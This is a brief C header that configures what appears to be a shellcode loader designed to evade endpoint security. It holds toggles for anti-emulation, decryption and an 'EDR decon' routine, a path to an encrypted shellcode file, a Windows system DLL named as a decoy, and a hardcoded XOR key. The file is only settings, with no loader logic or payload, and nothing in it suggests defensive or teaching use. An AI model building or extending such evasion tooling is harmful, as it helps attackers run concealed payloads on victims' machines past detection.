#pragma once

// === Feature toggles 1 = on / 0 = off ===
#define USE_GUARDRAILS 0
#define USE_ANTI_EMULATION 1
#define USE_EDR_DECON 0
#define USE_DECRYPTION 1

// === Payload settings ===
#define LOAD_FROM_DISK 1
#define PAYLOAD_PATH "C:/temp/custom_shellcode_3_enc.bin"
#define DECOY_DLL_PATH L"C:\\Windows\\System32\\edgehtml.dll"

// === EDR Decon settings ===
#define NUMBER_OF_ALLOCS 150
#define NUMBER_OF_ITERATIONS 5

// === Decryption settings ===
#ifndef XOR_KEY
#define XOR_KEY { 0x9c, 0xbe, 0xb5, 0x10, 0xf8, 0xc3, 0x7e, 0x8d }
#endif
